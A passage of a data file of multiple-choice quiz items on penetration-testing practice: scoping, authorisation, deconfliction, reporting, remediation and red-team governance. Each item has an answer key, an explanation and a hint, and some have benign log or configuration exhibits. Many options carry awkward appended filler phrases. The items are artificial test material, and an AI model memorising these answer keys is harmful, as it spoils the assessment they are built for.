    options: ["It is a time-boxed sample of risk and not a guarantee of safety","It finds every vulnerability that could ever exist","It replaces the need for ongoing vulnerability management","It proves that no attacker can ever get in"],
    correct: 0, why: "Tests are limited by time and scope.",
    hint: "Time-boxed."
  },
  {
    id: 259, rank: 1, role: "pentest", topic: "Credential Policy Findings", difficulty: "INTERMEDIATE",
    q: "A review finds many shared admin accounts. What is the best recommendation?",
    options: ["Keep the shared accounts, and change their password once every year","Named accounts with MFA and logged administrator actions","Share the password in a ticket, and every engineer can find it quickly","Remove logging to save storage space, then record the result in the ticket"],
    correct: 1, why: "Named accounts give accountability and MFA reduces takeover.",
    hint: "Accountability."
  },
  {
    id: 260, rank: 1, role: "pentest", topic: "Test Window Communication", difficulty: "INTERMEDIATE",
    q: "Testing may trigger alerts in the client's monitoring. What is the BEST way to handle it?",
    options: ["Warn the entire company by email every morning, and revisit the decision after the next release","Turn off the monitoring during all testing, and review the outcome at the next monthly meeting","Agree contacts and a deconfliction process for alerts in advance, as a general rule","Tell no one and the response is more genuine"],
    correct: 2, why: "Telling no one is the runner-up as it feels realistic, but it risks real incident escalation and wasted response effort.",
    hint: "Deconflict."
  },
  {
    id: 261, rank: 1, role: "pentest", topic: "Log Review Finding", difficulty: "INTERMEDIATE",
    exhibit: "02:00-02:12  214 failed logins  user=admin  src=198.51.100.20\nAlerts raised: 0\nAccount lockout threshold: not configured\nSIEM rule 'brute-force': disabled",
    q: "What does this log extract suggest about the client's monitoring?",
    options: ["Every failed login triggered an alert at once, in most cases","The logs were encrypted with a customer key","Repeated failed logins were not alerted on by the system","No users attempted to sign in during the period, in most cases"],
    correct: 2, why: "The absence of an alert for repeated failures reveals a detection gap.",
    hint: "Was there an alert?"
  },
  {
    id: 262, rank: 1, role: "pentest", topic: "Business Impact Mapping", difficulty: "INTERMEDIATE",
    q: "Why map technical findings to business processes?",
    options: ["It removes the need to rate the findings","It lets the tester avoid having to explain the finding to the client team","It shows leaders what the finding could do to the business","It makes the report look longer, and it appears more serious overall"],
    correct: 2, why: "Business context drives decisions.",
    hint: "Business impact."
  },
  {
    id: 263, rank: 1, role: "pentest", topic: "Responsible Disclosure", difficulty: "INTERMEDIATE",
    q: "A tester finds a flaw in a vendor's product while testing a client. What is the best step?",
    options: ["Sell the information to the highest bidder privately","Report it to the client and follow coordinated disclosure with the vendor, in the first instance","Publish it immediately on social media with full detail","Keep it secret, and never tell anyone about it"],
    correct: 1, why: "Coordinated disclosure gives the vendor time to fix.",
    hint: "Coordinated."
  },
  {
    id: 264, rank: 1, role: "pentest", topic: "Web Header Exhibit", difficulty: "INTERMEDIATE",
    exhibit: "HTTP/1.1 200 OK\nDate: Mon, 02 Mar 2026 10:14:00 GMT\nServer: nginx\nContent-Length: 5231\nStrict-Transport-Security: max-age=31536000\nX-Frame-Options: DENY",
    q: "Which missing header on this response is the best-known gap for protecting browsers from content injection?",
    options: ["Date","Server","Content-Security-Policy","Content-Length, as a general rule"],
    correct: 2, why: "A content security policy restricts which scripts a page may run.",
    hint: "Browser protection header."
  },
  {
    id: 265, rank: 1, role: "pentest", topic: "Cloud Test Authorisation", difficulty: "INTERMEDIATE",
    q: "What is important when testing systems hosted in a third-party cloud?",
    options: ["Use the provider's account of another customer, where that is practical","Test first and ask the provider afterwards, in the first instance","Assume all providers allow any test at any time, as a general rule","Check the provider's policy and get the client's approval"],
    correct: 3, why: "Provider rules and client approval both apply.",
    hint: "Provider policy."
  },
  {
    id: 266, rank: 1, role: "pentest", topic: "Findings Aggregation", difficulty: "INTERMEDIATE",
    q: "Which grouping of findings is most helpful for fixing them efficiently?",
    options: ["Group by root cause so one fix resolves many issues, in most cases","Sort them by the length of their titles and the report looks even, and tidy","Place all informational ones at the top, and review the outcome at the next monthly meeting","List them in the order that the tester happened to find them during work"],
    correct: 0, why: "Root cause grouping reduces repeated work.",
    hint: "Root cause."
  },
  {
    id: 267, rank: 1, role: "pentest", topic: "Wireless Review Scope", difficulty: "INTERMEDIATE",
    q: "Which scoping question is most important for a wireless assessment?",
    options: ["Which networks and locations the client owns and authorises","Whether the testers prefer day or night work, as a general rule","Which neighbouring networks look weakest on the street, in most cases","How many antennas the testers can carry in a bag"],
    correct: 0, why: "Only networks the client owns can be tested.",
    hint: "Ownership."
  },
  {
    id: 268, rank: 1, role: "pentest", topic: "Metrics After Testing", difficulty: "INTERMEDIATE",
    q: "Which metric best shows the client improved after a retest?",
    options: ["A new logo on the cover","Fewer open high-risk findings and faster fix times","More findings in the report than last time as the scope has grown","A longer report with larger screenshots, and a more colourful title page"],
    correct: 1, why: "Open risk and time to fix show progress.",
    hint: "Risk down."
  },
  {
    id: 269, rank: 1, role: "pentest", topic: "Backup and Recovery Findings", difficulty: "INTERMEDIATE",
    q: "The test shows that backups are stored on the same network share that malware could reach. What is the best advice?",
    options: ["Keep an offline or immutable copy and test restores","Add a second copy to the same share, wherever possible","Reduce the number of backups, and review the outcome at the next monthly meeting","Rename the share to something unusual, in the first instance"],
    correct: 0, why: "Isolated copies survive malware that reaches production.",
    hint: "Isolate copies."
  },
  {
    id: 270, rank: 1, role: "pentest", topic: "Data Handling in Tests", difficulty: "INTERMEDIATE",
    q: "The tester finds a file that contains customer records during the work. What is the BEST action?",
    options: ["Leave a copy on a USB stick for later study","Record minimal proof, avoid copying the data and report it promptly, as a first step","Download all of it to prove how serious the issue is","Share a sample with colleagues to get their opinion, then record the result in the ticket"],
    correct: 1, why: "Downloading everything is the runner-up as it proves impact, but it creates unnecessary exposure of personal data.",
    hint: "Minimal proof."
  },
  {
    id: 271, rank: 1, role: "pentest", topic: "Segmentation Review Exhibit", difficulty: "INTERMEDIATE",
    exhibit: "Rule 18  src=Users-LAN  dst=Server-LAN  svc=ANY  action=ALLOW  hits=4,208,113\nRule 19  src=Guest-WiFi dst=Server-LAN  svc=ANY  action=ALLOW  hits=11,009\nRule 99  src=ANY dst=ANY svc=ANY action=DENY",
    q: "What does this firewall rule review show?",
    options: ["A narrow rule that allows one port for one host","A rule that blocks all traffic by default","A rule that is disabled and logged","An overly broad any-to-any rule between user, and server networks, in most cases"],
    correct: 3, why: "Any-to-any rules remove segmentation benefits.",
    hint: "Any to any."
  },
  {
    id: 272, rank: 1, role: "pentest", topic: "Password Policy Review", difficulty: "INTERMEDIATE",
    q: "Which password policy change is best supported by current guidance?",
    options: ["Short complex passwords that change every month, in most cases","Passwords written on sticky notes at each desk","Long passphrases checked against known breached lists and MFA","A single shared password for each team"],
    correct: 2, why: "Length, breach checks and MFA outperform forced frequent changes.",
    hint: "Length and MFA."
  },
  {
    id: 273, rank: 1, role: "pentest", topic: "Asset Criticality", difficulty: "INTERMEDIATE",
    q: "Why should testers ask the client which systems are most critical?",
    options: ["To choose which systems to publish online, as a general rule","To avoid testing any system at all","To focus effort and to rate findings by business impact","To pick the easiest system for an early finish"],
    correct: 2, why: "Criticality guides focus and rating.",
    hint: "Critical assets."
  },
  {
    id: 274, rank: 1, role: "pentest", topic: "Pre-Engagement Questions", difficulty: "INTERMEDIATE",
    q: "Which pre-engagement question helps avoid outages?",
    options: ["What colour are the servers in the data centre","What is the favourite meal of the team","Which systems are fragile or have restricted testing windows","Which tool did the previous tester like most, as a general rule"],
    correct: 2, why: "Fragile systems need extra care.",
    hint: "Fragility."
  },
  {
    id: 275, rank: 1, role: "pentest", topic: "Report Review Process", difficulty: "INTERMEDIATE",
    q: "Why should a report be peer reviewed before delivery?",
    options: ["To make the report look longer","To catch errors in facts, ratings and wording","To avoid sending it to the client, in most cases","To change the findings to match the budget, in most cases"],
    correct: 1, why: "Peer review improves accuracy.",
    hint: "Quality check."
  },
  {
    id: 276, rank: 1, role: "pentest", topic: "Mitigation vs Remediation", difficulty: "INTERMEDIATE",
    q: "What is the difference between mitigation and remediation?",
    options: ["Remediation is always cheaper than mitigation","Mitigation is only for hardware, and remediation only for people","Mitigation reduces the risk while remediation removes the cause, as a general rule","They mean exactly the same thing in every case"],
    correct: 2, why: "Mitigation reduces likelihood or impact while remediation fixes the underlying flaw.",
    hint: "Reduce versus remove."
  },
  {
    id: 277, rank: 1, role: "pentest", topic: "Client Debrief", difficulty: "INTERMEDIATE",
    q: "What is the main purpose of a debrief meeting after testing?",
    options: ["To sell unrelated products to the client, as a general rule","To avoid sharing any detail of the work, as a general rule","To criticise the client's staff in public, as a general rule","To explain the findings and agree priorities and owners"],
    correct: 3, why: "A debrief turns the report into action.",
    hint: "Priorities and owners."
  },
  {
    id: 278, rank: 1, role: "pentest", topic: "Exception Handling Process", difficulty: "INTERMEDIATE",
    q: "A client cannot fix a finding this quarter. What should happen?",
    options: ["Document a risk acceptance with an owner, and add compensating controls, and review the outcome at the next monthly meeting","Ignore it until the next audit","Delete the finding from the register","Mark it fixed to keep the dashboard green"],
    correct: 0, why: "Accepted risk needs ownership and mitigation.",
    hint: "Formal acceptance."
  },
  {
    id: 279, rank: 1, role: "pentest", topic: "TLS Configuration Exhibit", difficulty: "INTERMEDIATE",
    exhibit: "Protocols: TLS 1.3 yes, TLS 1.2 yes, TLS 1.0 yes, SSL 3 no\nCiphers: ECDHE-AES256-GCM yes, RC4 no\nCertificate: trusted CA, valid 214 days\nHSTS: max-age=31536000",
    q: "Which line in this configuration summary should the client fix first?",
    options: ["Support for modern forward-secret cipher suites, as a general rule","Support for an obsolete protocol version that is still enabled","A certificate signed by a trusted authority","HTTP Strict Transport Security with a long lifetime"],
    correct: 1, why: "Obsolete protocol versions weaken the connection and should be disabled.",
    hint: "Look for the old version."
  },
  {
    id: 280, rank: 1, role: "pentest", topic: "Scan Frequency Decision", difficulty: "INTERMEDIATE",
    q: "How often should a client run vulnerability scans on internet-facing systems?",
    options: ["Continuously or at least monthly and after major changes, as a general rule","Never as testing is done yearly","Only after a breach has been confirmed","Once every five years with the audit"],
    correct: 0, why: "Exposure changes constantly, so frequent scanning is needed.",
    hint: "Regular and event-driven."
  },
  {
    id: 281, rank: 2, role: "pentest", topic: "Findings Validation Workflow", difficulty: "ADVANCED",
    q: "What should happen before a high-severity finding is sent to the client?",
    options: ["A decision to leave out any supporting evidence entirely","Peer validation of the evidence and impact","An email to the whole team that asks everyone for their opinion on the wording","A quick edit to make the wording sound more dramatic"],
    correct: 1, why: "Validated evidence prevents false alarms and disputes.",
    hint: "Validate."
  },
  {
    id: 282, rank: 2, role: "pentest", topic: "Attack Surface Report Exhibit", difficulty: "ADVANCED",
    exhibit: "Domain: example.com  Discovered: 63 hosts\nDocumented: 41\nUndocumented: dev-old.example.com, vpn-test.example.com, files2.example.com\nOpen admin panels: 4   Expired certs: 7",
    q: "What does this external attack surface summary highlight?",
    options: ["Forgotten internet-facing services to review","A list of staff members who work from home on Fridays in the main office","A fully patched and documented environment that the client already maintains","Internal systems that nobody outside the company is able to reach at all"],
    correct: 0, why: "Unexpected exposed services increase risk until they are owned or removed.",
    hint: "Unknown exposure."
  },
  {
    id: 283, rank: 2, role: "pentest", topic: "Threat Model Alignment", difficulty: "ADVANCED",
    q: "A client asks what to test first. What is the BEST way to decide?",
    options: ["Start with whichever system has the shortest name","Start with the tool that finds the most vulnerabilities, and revisit the decision after the next release","Start with the oldest system in the inventory list","Start from the likely threats and the most valuable assets"],
    correct: 3, why: "Oldest first is the runner-up as age often means weakness, but threats and asset value should guide the order.",
    hint: "Threat-led."
  },
  {
    id: 284, rank: 2, role: "pentest", topic: "Purple Team Exercise", difficulty: "ADVANCED",
    q: "What is the main aim of a purple team exercise?",
    options: ["Testers and defenders working together on detection","Replacing the defenders with a team of outside testers for the whole year","Proving that the defenders are unable to carry out their own daily work well","Keeping all of the findings secret from the defenders after the exercise ends"],
    correct: 0, why: "Collaboration turns each simulated action into a detection improvement.",
    hint: "Collaboration."
  },
  {
    id: 285, rank: 2, role: "pentest", topic: "Detection Gap Exhibit", difficulty: "ADVANCED",
    exhibit: "Technique              Executed  Logged  Alerted  Responded\nScheduled task created  yes       yes     no       no\nCredential store read   yes       no      no       no\nRemote service use      yes       yes     yes      yes\nLog clearing            yes       yes     no       no",
    q: "What does this exercise result show?",
    options: ["The exercise did not take place on the agreed day, as a general rule","The logs were deleted before the exercise began","Several simulated behaviours were not detected and need new rules","Every simulated behaviour was detected, and responded to"],
    correct: 2, why: "Undetected behaviours show where coverage is missing.",
    hint: "Detected: no."
  },
  {
    id: 286, rank: 2, role: "pentest", topic: "Rules for Safe Simulation", difficulty: "ADVANCED",
    q: "Which rule keeps adversary simulation safe for production?",
    options: ["Running it during peak trading hours without notice, wherever possible","Telling the targets to pretend that nothing is happening","Agreed stop conditions and a named contact who can halt it","No rules, and the simulation feels more realistic"],
    correct: 2, why: "Stop conditions prevent impact to live services.",
    hint: "Stop conditions."
  },
  {
    id: 287, rank: 2, role: "pentest", topic: "Report Quality Review", difficulty: "ADVANCED",
    q: "Which is the best sign of a high-quality finding description?",
    options: ["It blames a named employee for the issue","It uses as many technical words as possible and it looks expert, and serious","It includes screenshots of unrelated systems that happened to be open at the time","A reader can reproduce it and see the risk"],
    correct: 3, why: "Clarity and evidence make findings reliable.",
    hint: "Clear and verifiable."
  },
  {
    id: 288, rank: 2, role: "pentest", topic: "Risk Acceptance Challenge", difficulty: "ADVANCED",
    q: "A client wants to accept a Critical finding with no mitigation. What should the lead do?",
    options: ["Remove the finding, and the report looks better, and review the outcome at the next monthly meeting","Argue with the client until they change their mind","Explain the impact and ensure the decision is made by an accountable owner","Hide the decision from the client's board, until the next scheduled review takes place"],
    correct: 2, why: "The decision belongs to the accountable risk owner with full information.",
    hint: "Accountable owner."
  },
  {
    id: 289, rank: 2, role: "pentest", topic: "Remediation Verification", difficulty: "ADVANCED",
    q: "How should a tester confirm that a fix for a reported flaw is effective?",
    options: ["Trust the ticket status without any further work, until the next scheduled review takes place","Close the ticket when the due date passes, until the next scheduled review takes place","Ask the developer whether they feel confident","Repeat the original check under the same conditions and record the result"],
    correct: 3, why: "Verification uses the original criteria.",
    hint: "Repeat the check."
  },
  {
    id: 290, rank: 2, role: "pentest", topic: "Legal Authorisation Exhibit", difficulty: "ADVANCED",
    exhibit: "Engagement letter (draft)\nClient: Northwind Ltd   Provider: Contoso Security\nService: penetration test\nFee: 24,000 GBP   Report due: 14 days after testing\nTargets: [to be agreed]   Dates: [to be agreed]\nSigned: client only",
    q: "What is missing from this engagement letter?",
    options: ["The tester's favourite colour, and hobby, in most cases","The version of the word processor used","A description of the lunch arrangements, as a general rule","A clear list of authorised targets, and testing dates"],
    correct: 3, why: "Without a defined scope the work may be unauthorised.",
    hint: "Scope."
  },
  {
    id: 291, rank: 2, role: "pentest", topic: "Handling Out-of-Scope Discoveries", difficulty: "ADVANCED",
    q: "While testing, a tester sees signs that a real attacker is already inside the client network. What is the BEST action?",
    options: ["Try to remove the intruder without telling anyone","Pause testing and notify the client contact through the agreed channel, as a general rule","Announce it publicly and others can help","Continue testing, and mention it at the end of the project"],
    correct: 1, why: "Continuing is the runner-up as it keeps to the plan, but an active compromise needs immediate escalation.",
    hint: "Escalate now."
  },
  {
    id: 292, rank: 2, role: "pentest", topic: "Vulnerability Scoring Limits", difficulty: "ADVANCED",
    q: "Why should CVSS base scores be adjusted using local context?",
    options: ["The score only works for printers and phones, and never for servers or databases","The score ignores the asset's exposure, and value, in most cases","The score is set by the client for each finding","The score is always wrong, and must be discarded by every analyst before use"],
    correct: 1, why: "Environmental factors change real risk.",
    hint: "Context matters."
  },
  {
    id: 293, rank: 2, role: "pentest", topic: "Prioritisation Matrix Exhibit", difficulty: "ADVANCED",
    exhibit: "ID  Finding             Likelihood  Impact\n 1  Weak admin MFA      High        High\n 2  Missing banner      Low         Low\n 3  Verbose error page  Medium      Low\n 4  Open file share     Medium      Medium",
    q: "Which finding should be fixed first using this prioritisation matrix?",
    options: ["The one with low likelihood and low impact that is easy for the team to close","High likelihood and high impact","The one that the team happened to find last during the final day of the work","The one with the longest description as it must be the most important"],
    correct: 1, why: "High likelihood and impact create the highest risk.",
    hint: "Top right."
  },
  {
    id: 294, rank: 2, role: "pentest", topic: "Secure Development Feedback", difficulty: "ADVANCED",
    q: "How can testers best help developers prevent repeat findings?",
    options: ["Tell them to be more careful next time, where that is practical","Send a list of names of developers who made mistakes, as soon as practical","Share root causes and add checks to the build pipeline","Wait until the next test to mention it, and review the outcome at the next monthly meeting"],
    correct: 2, why: "Feeding root causes into the pipeline prevents recurrence.",
    hint: "Root cause to pipeline."
  },
  {
    id: 295, rank: 2, role: "pentest", topic: "Authentication Review Findings", difficulty: "ADVANCED",
    q: "What is the strongest recommendation for protecting an exposed admin portal?",
    options: ["Allow access only on weekends","Use a longer username for every administrator","Place it behind VPN or identity-aware access with MFA, as a first step","Hide the address and hope that nobody finds it, and revisit the decision after the next release"],
    correct: 2, why: "Reducing exposure and requiring strong authentication cuts risk most.",
    hint: "Reduce exposure."
  },
  {
    id: 296, rank: 2, role: "pentest", topic: "Deconfliction Exhibit", difficulty: "ADVANCED",
    exhibit: "SOC-2291  Severity: Major  Opened 10:42\nDescription: scanning activity from 198.51.100.50 against payroll subnet\nActions: IP blocked, CISO paged, legal notified\nResolution 13:05: authorised penetration test, no deconfliction contact on file",
    q: "What problem does this ticket show about the test and the SOC?",
    options: ["The SOC treated the test traffic as a real incident without notice, in most cases","The test was cancelled before it began","The SOC ignored all alerts during the exercise","The report was delivered too early"],
    correct: 0, why: "A deconfliction contact would have avoided the escalation.",
    hint: "No agreed contact."
  },
  {
    id: 297, rank: 2, role: "pentest", topic: "Data Minimisation in Evidence", difficulty: "ADVANCED",
    q: "What should a tester do with personal data seen in a database during an authorised test?",
    options: ["Avoid copying it and show only masked proof of access","Email a sample to the whole team","Keep it on a personal device for later","Copy the full table for a thorough review, and revisit the decision after the next release"],
    correct: 0, why: "Minimal masked proof limits exposure.",
    hint: "Mask the proof."
  },
  {
    id: 298, rank: 2, role: "pentest", topic: "Third-Party Components", difficulty: "ADVANCED",
    q: "A scan shows a library with a known flaw used across many apps. What is the best recommendation?",
    options: ["Wait until the vendor stops supporting it, in the first instance","Remove the finding as it is only a library","Rename the library to hide it","Inventory its use then upgrade it and add dependency monitoring"],
    correct: 3, why: "Software inventory and monitoring address the whole class of problem.",
    hint: "Inventory and monitor."
  },
  {
    id: 299, rank: 2, role: "pentest", topic: "Mobile App Review Scope", difficulty: "ADVANCED",
    q: "What is a sensible scoping question for a mobile application assessment?",
    options: ["The platforms, versions and backend in scope, in most cases","The number of stars the app has been given in the store by its many users","The colour of the app icon in the store listing and on the device home screen","Which phone model the testers like best when they are working during the week"],
    correct: 0, why: "Scope must cover the app and its backend.",
    hint: "Platforms and backend."
  },
  {
    id: 300, rank: 2, role: "pentest", topic: "Insecure Direct Reference Report", difficulty: "ADVANCED",
    q: "How should a report describe missing authorisation checks on record access?",
    options: ["As a minor cosmetic problem in the interface","As a configuration of the colour theme","As a broken access control issue with the data affected, and a fix, as a general rule","As a note that no action is needed"],
    correct: 2, why: "Access control failures affect confidentiality and need server-side fixes.",
    hint: "Broken access control."
  },
  {
    id: 301, rank: 2, role: "pentest", topic: "Retest Scope Exhibit", difficulty: "ADVANCED",
    exhibit: "F-01 Weak admin MFA        Fixed (verified)\nF-02 Open file share       Fixed (verified)\nF-03 Outdated framework    Partially fixed: 2 of 5 apps still on old version\nF-04 Verbose errors        Not fixed",
    q: "What does this retest summary show?",
    options: ["All findings remain open and unchanged, as a general rule","The retest never started","Most fixes worked but one finding is partly resolved","All findings were closed without checks"],
    correct: 2, why: "Partial remediation should be recorded with the remaining risk.",
    hint: "Look at the statuses."
  },
  {
    id: 302, rank: 2, role: "pentest", topic: "Cyber Insurance Evidence", difficulty: "ADVANCED",
    q: "A client asks for the test report to support an insurance renewal. What is the best approach?",
    options: ["Send the full technical report to anyone who asks, as soon as practical","Refuse to provide any evidence of testing, until the next scheduled review takes place","Post the report on the company website","Provide a suitable summary and keep sensitive details restricted"],
    correct: 3, why: "Summaries protect sensitive details.",
    hint: "Restrict detail."
  },
  {
    id: 303, rank: 2, role: "pentest", topic: "Network Segmentation Findings", difficulty: "ADVANCED",
    q: "A test shows that office devices can reach industrial control systems. What is the BEST recommendation?",
    options: ["Segment the networks with filtered, monitored access points","Rename the networks, and they look separate, as soon as practical","Allow all traffic and monitor it later, then record the result in the ticket","Rely on the obscurity of the addresses, where that is practical"],
    correct: 0, why: "Obscurity is the runner-up as it is cheap, but it gives no real barrier between the networks.",
    hint: "Enforce segmentation."
  },
  {
    id: 304, rank: 2, role: "pentest", topic: "Logging Recommendations", difficulty: "ADVANCED",
    q: "Which logging recommendation best helps a future investigation?",
    options: ["Forward logs to a central protected store with enough retention","Turn off logs to protect privacy, and revisit the decision after the next release","Delete logs after twenty-four hours, until the next scheduled review takes place","Keep logs on each machine until the disk fills, in the first instance"],
    correct: 0, why: "Central, protected, retained logs preserve evidence.",
    hint: "Central and protected."
  },
  {
    id: 305, rank: 2, role: "pentest", topic: "Phishing Exercise Reporting", difficulty: "ADVANCED",
    q: "How should the results of a phishing awareness exercise be reported?",
    options: ["With a list of staff names and their mistakes, in most cases","In aggregate by department without naming individuals","Posted on the staff notice board","Only to the people who clicked"],
    correct: 1, why: "Aggregate reporting supports learning without blame.",
    hint: "Aggregate."
  },
  {
    id: 306, rank: 2, role: "pentest", topic: "Ticketing Integration", difficulty: "ADVANCED",
    q: "Why integrate findings with the client's ticketing system?",
    options: ["It makes the report heavier to send","It assigns owners and tracks remediation to closure","It removes the need for a debrief","It hides open issues from managers"],
    correct: 1, why: "Tracking drives fixes to completion.",
    hint: "Track to closure."
  },
  {
    id: 307, rank: 2, role: "pentest", topic: "Executive Question Handling", difficulty: "ADVANCED",
    q: "An executive asks whether the client is secure after a clean test. What is the best answer?",
    options: ["Ask someone else about it","No, as every system is always insecure","The test found no issues within its scope and time and is not a guarantee","Yes, you are completely secure and can relax"],
    correct: 2, why: "The answer should explain scope and limits honestly.",
    hint: "Honest limits."
  },
  {
    id: 308, rank: 2, role: "pentest", topic: "Wi-Fi Segmentation Exhibit", difficulty: "ADVANCED",
    exhibit: "SSID: Corp-Guest  VLAN 30\nACL guest-out: permit 10.0.0.0/8 any\nACL guest-out: permit any any\nInternal server range: 10.20.0.0/16  (reachable: yes)",
    q: "What does this network configuration summary indicate?",
    options: ["Guest wireless devices can reach internal servers","Guest devices are isolated from internal servers","Internal servers are offline","The guest network is disabled"],
    correct: 0, why: "Guest networks should not have access to internal resources.",
    hint: "Guest to internal."
  },
  {
    id: 309, rank: 2, role: "pentest", topic: "Test Planning Estimation", difficulty: "ADVANCED",
    q: "Which factor most affects the time needed for an assessment?",
    options: ["The length of the report title that the project manager decides to use at the end","The size and complexity of the scope, in most cases","The weather on the first day of the engagement at the client's head office site","The choice of music that the tester plays while working in the office each day"],
    correct: 1, why: "Scope drives effort.",
    hint: "Scope."
  },
  {
    id: 310, rank: 2, role: "pentest", topic: "Container Review Findings", difficulty: "ADVANCED",
    q: "A review finds containers running as root with writable filesystems. What is the best recommendation?",
    options: ["Move the containers to a larger node","Run as non-root with a read-only filesystem and drop capabilities, in most cases","Allow root for easier debugging, and review the outcome at the next monthly meeting","Add more containers to the cluster, and revisit the decision after the next release"],
    correct: 1, why: "Reducing privileges limits impact if a container is compromised.",
    hint: "Least privilege."
  },
  {
    id: 311, rank: 2, role: "pentest", topic: "Backups Finding Exhibit", difficulty: "ADVANCED",
    exhibit: "Backup target: nas-prod-02  (same domain as production)\nWrite access: Domain Admins, backup-svc\nImmutability: off   Offline copy: none\nLast restore test: 14 months ago",
    q: "Which weakness does this backup summary show?",
    options: ["Backups are stored offline and immutable","Backups are encrypted with a separate key","Backups are writable by the same admin accounts as production","Backups are tested every month"],
    correct: 2, why: "Shared admin control lets ransomware destroy backups.",
    hint: "Who can write?"
  },
  {
    id: 312, rank: 2, role: "pentest", topic: "Cloud Findings Reporting", difficulty: "ADVANCED",
    q: "How should a cloud misconfiguration finding be reported to be most useful?",
    options: ["With a vague warning to review things","With a statement that the cloud is unsafe","With only the name of the provider","With the affected resource, setting, risk and the corrected setting, in most cases"],
    correct: 3, why: "Specific resources and fixes enable action.",
    hint: "Resource and fix."
  },
  {
    id: 313, rank: 2, role: "pentest", topic: "Metrics for Test Programmes", difficulty: "ADVANCED",
    q: "Which metric best shows the value of a regular testing programme?",
    options: ["Number of reports printed","Number of hours spent in meetings, as a general rule","Number of tools bought","Reduction in repeated findings and time to fix"],
    correct: 3, why: "Trends show learning and improvement.",
    hint: "Trend."
  },
  {
    id: 314, rank: 2, role: "pentest", topic: "Social Media Exposure", difficulty: "ADVANCED",
    q: "What is a sensible finding when staff reveal internal details on public profiles?",
    options: ["An issue only for the legal team","Information exposure for policy and awareness work","Something that is never a risk as the details are already public on the web","A reason to monitor every private chat that employees have with their families"],
    correct: 1, why: "Public details help attackers prepare.",
    hint: "Policy and awareness."
  },
  {
    id: 315, rank: 2, role: "pentest", topic: "Change Control for Fixes", difficulty: "ADVANCED",
    q: "Why should security fixes follow change control?",
    options: ["To avoid outages and keep a record of changes","To stop the testers from checking whether the fixes work as the client expected","To hide changes from auditors","To delay all security fixes for several months until the next planned audit"],
    correct: 0, why: "Controlled changes are safer and auditable.",
    hint: "Safe changes."
  },
  {
    id: 316, rank: 2, role: "pentest", topic: "Secrets in Repositories", difficulty: "ADVANCED",
    q: "A review finds credentials committed to a code repository. What is the best action?",
    options: ["Revoke and rotate them then add secret scanning","Rename the credentials","Make the repository private only","Delete the file, and leave the credentials valid"],
    correct: 0, why: "Exposed secrets must be treated as compromised.",
    hint: "Rotate."
  },
  {
    id: 317, rank: 2, role: "pentest", topic: "Engagement Closure", difficulty: "ADVANCED",
    q: "What should be done with test data when an engagement closes?",
    options: ["Use it to train new staff without approval","Securely delete or return it as agreed","Post it to a shared forum and other testers can learn from the client's data","Keep it forever on a laptop that travels between the offices of the testing firm"],
    correct: 1, why: "Closure includes disposal.",
    hint: "Dispose per contract."
  },
  {
    id: 318, rank: 2, role: "pentest", topic: "Cloud Storage Exposure Exhibit", difficulty: "ADVANCED",
    exhibit: "Bucket: hr-exports-2025  Public access: ON\nObjects: salary-review.xlsx, staff-list.csv, contracts/\nAccess logs: enabled   Anonymous GETs last 30 days: 1,244",
    q: "What should the report recommend for this storage finding?",
    options: ["Rename the bucket to something longer, until the next scheduled review takes place","Disable the logging of access requests","Block public access, and review who read the objects","Keep public access to speed up downloads, where that is practical"],
    correct: 2, why: "A public bucket with sensitive names needs closing and an access review.",
    hint: "Public and sensitive."
  },
  {
    id: 319, rank: 2, role: "pentest", topic: "Password Spray Finding Reporting", difficulty: "ADVANCED",
    q: "A test shows weak passwords were accepted for many accounts. What is the best recommendation?",
    options: ["Ask staff to choose cleverer passwords","Remove the finding from the report","Change the login page colour","Block common passwords and enforce MFA, and lockout monitoring, in most cases"],
    correct: 3, why: "Policy controls and MFA reduce the effect of weak passwords.",
    hint: "Controls over advice."
  },
  {
    id: 320, rank: 2, role: "pentest", topic: "Business Continuity Test", difficulty: "ADVANCED",
    q: "Why include recovery objectives in a security test report?",
    options: ["To avoid discussing impact","To replace the findings list","To make the report look more technical","To show whether recovery meets the business expectations"],
    correct: 3, why: "Impact is judged against recovery objectives.",
    hint: "RTO and RPO."
  },
  {
    id: 321, rank: 3, role: "pentest", topic: "Testing Programme Design", difficulty: "EXPERT",
    q: "A large company wants a testing programme for 300 applications. What is the BEST way to structure it?",
    options: ["Test every application at full depth every single month, wherever possible","Test a random application each quarter and ignore the rest","Test only the applications that developers choose to submit, and revisit the decision after the next release","Tier applications by risk and set testing depth and frequency per tier"],
    correct: 3, why: "Testing everything monthly is the runner-up as it is thorough, but it is unaffordable and does not match effort to risk.",
    hint: "Risk tiers."
  },
  {
    id: 322, rank: 3, role: "pentest", topic: "Threat-Led Test Planning", difficulty: "EXPERT",
    q: "How should an architect use threat intelligence when planning an assessment?",
    options: ["Pick scenarios by drawing names from a hat each time","Choose scenarios that reflect the actors likely to target the sector, as a general rule","Copy last year's plan without any review of the threats","Use only the techniques that the testers find easiest"],
    correct: 1, why: "Threat-led scenarios make the exercise relevant to real risk.",
    hint: "Relevant threats."
  },
  {
    id: 323, rank: 3, role: "pentest", topic: "Detection Coverage Exhibit", difficulty: "EXPERT",
    exhibit: "Tactic                 Tested  Detected\nInitial access         8       7\nExecution              10      8\nCredential access      9       2\nLateral movement       7       1\nExfiltration           5       3",
    q: "Which conclusion does this coverage map support?",
    options: ["Initial access activity has the strongest detection only","Credential and lateral movement activity has the weakest detection","No techniques were tested during the exercise","Every technique is fully detected, and responded to"],
    correct: 1, why: "Low coverage areas should drive detection engineering priorities.",
    hint: "Lowest coverage."
  },
  {
    id: 324, rank: 3, role: "pentest", topic: "Rules for Red Team Governance", difficulty: "EXPERT",
    q: "Which governance element is essential for a red team operation?",
    options: ["Informing every employee about it and nothing at all is a surprise to staff","A public announcement of the dates, and targets","No oversight, and the team can work freely","A small trusted control group that can stop the operation"],
    correct: 3, why: "A white cell keeps the exercise safe and controlled.",
    hint: "White cell."
  },
  {
    id: 325, rank: 3, role: "pentest", topic: "Metrics for Assurance", difficulty: "EXPERT",
    q: "Which metric best shows assurance programme health to a board?",
    options: ["Number of testers employed by the vendor, as a general rule","Time to fix critical findings and trend of repeat issues","Total number of tests carried out last year, as a general rule","Average length of the reports delivered"],
    correct: 1, why: "Outcomes show risk reduction better than activity counts.",
    hint: "Outcomes."
  },
  {
    id: 326, rank: 3, role: "pentest", topic: "Vendor Selection for Testing", difficulty: "EXPERT",
    q: "Which criterion should carry the most weight when selecting a testing provider?",
    options: ["Relevant experience, method quality and handling of client data","The longest list of tools in their brochure","The most colourful sample report in the proposal, as a general rule","The lowest day rate offered with no other conditions, as a general rule"],
    correct: 0, why: "Quality and trust matter more than price alone.",
